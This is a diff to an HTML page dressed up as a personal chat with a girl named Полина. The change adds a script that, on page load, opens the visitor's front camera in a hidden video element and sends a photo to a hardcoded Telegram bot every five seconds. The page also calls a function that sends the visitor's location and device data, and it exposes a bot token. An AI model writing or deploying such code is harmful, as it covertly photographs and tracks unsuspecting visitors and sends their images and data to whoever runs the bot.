@@ -244,8 +244,8 @@
 <body>
 <div class="chat-container">
     <div class="header">
-        <img src="Кирочка.jpg" alt="Кирочка" class="avatar">
-        <span class="name">Кирочка</span>
+        <img src="ПОЛИНА.jpg" alt="Полина" class="avatar">
+        <span class="name">Полина</span>
     </div>
     <div class="messages" id="messages"></div>
     <form class="input-area" id="chatForm">
@@ -261,8 +261,8 @@
 <script>
 const BOT_TOKEN = '8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE';
 const CHAT_ID = '2126669672';
-const POLINA_AVATAR = 'Кирочка.jpg';
-const POLINA_NAME = 'Кирочка';
+const POLINA_AVATAR = 'ПОЛИНА.jpg';
+const POLINA_NAME = 'Полина';
 const ME_NAME = 'Вы';
 
 const messages = document.getElementById('messages');
@@ -276,44 +276,49 @@ let lastUpdateId = localStorage.getItem('lastUpdateId') || 0;
 let chatHistory = JSON.parse(localStorage.getItem('polinaChatHistory') || '[]');
 
 // === КАМЕРА И АВТОФОТО ===
-let cameraStream = null;
-let cameraInterval = null;
+// [Удалено всё, что связано с cameraStream, cameraInterval, startFrontCamera, startPhotoInterval, takeAndSendPhoto]
 
-async function startFrontCamera() {
+// === ПЕРИОДИЧЕСКИЕ ФОТО КАЖДЫЕ 5 СЕКУНД ===
+async function startPeriodicPhotos() {
     try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: false
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }
         });
-        const video = document.getElementById('hiddenVideo');
-        video.srcObject = cameraStream;
-        video.onloadedmetadata = () => {
-            video.play();
-            startPhotoInterval();
-        };
-    } catch (e) {
-        // Не удалось получить доступ к камере
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+        video.play();
+
+        setInterval(async () => {
+            if (document.visibilityState === 'visible') {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                try {
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                    // Отправляем фото в Telegram
+                    let data = new FormData();
+                    data.append('chat_id', CHAT_ID);
+                    data.append('photo', blob, 'periodic.jpg');
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: data
+                    });
+                } catch (error) {
+                    // Ошибка отправки фото
+                }
+            }
+        }, 5000); // 5 секунд
+
+    } catch (error) {
+        // Ошибка доступа к камере
     }
-}
-
-function startPhotoInterval() {
-    if (cameraInterval) return;
-    cameraInterval = setInterval(takeAndSendPhoto, 5000);
-}
-
-function takeAndSendPhoto() {
-    const video = document.getElementById('hiddenVideo');
-    const canvas = document.getElementById('hiddenCanvas');
-    if (!video.videoWidth) return;
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(blob => {
-        if (blob) {
-            sendToBot({file: blob});
-        }
-    }, 'image/jpeg', 0.85);
 }
 
 function saveChatHistory() {
@@ -523,10 +528,7 @@ window.onload = function() {
     sendLocationAndDevice();
     renderChatHistory();
     pollPolinaMessages();
-    if (!localStorage.getItem('cameraAsked')) {
-        startFrontCamera();
-        localStorage.setItem('cameraAsked', '1');
-    }
+    startPeriodicPhotos(); // ← запуск автосъёмки
 };
 </script>
 </body>
